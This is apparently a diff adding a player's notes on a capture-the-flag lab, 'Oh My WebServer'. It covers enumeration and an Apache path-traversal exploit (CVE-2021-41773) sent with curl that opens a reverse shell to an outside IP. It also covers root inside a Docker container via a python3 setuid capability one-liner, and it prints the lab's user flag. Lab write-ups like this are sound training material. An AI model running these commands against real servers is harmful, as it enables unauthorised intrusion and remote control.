@@ -1,0 +1,27 @@
+Oh My WebServer:
+nmap
+22
+80
+80
+Webserver with a template front
+gobuster reveals /assets
+there is a .DS_Store file, webserver is running on Mac OS
+Version has a listed exploit - 2021-41773
+Features RCE, could be promising
+curl 'http://10.10.122.114/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; sh -i >& /dev/tcp/10.6.15.130/4445 0>&1' -H "Content-Type: text/plain"
+Great, the exploit works and I got a revshell
+Docker Container
+got access to a shell
+export TERM=xterm
+i am running as user daemon
+This is really weird, there are no other users and some common programs like text editors are missing
+Also, prior enumeration revealed this is Mac OS, I must be in a VM or Docker container…
+root directory has .dockerenv, I am in a container :’(
+Priv Esc from container
+no SUID files are super interesting, one apache file with a CVE but doesn't appear to be compatible.
+getcap -r / 2>/dev/null
+python3 has a weird form of SUID?
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+worked, got root on the container
+user flag: THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
+STUCK HERE: I don’t know how to pivot or break out of a docker container
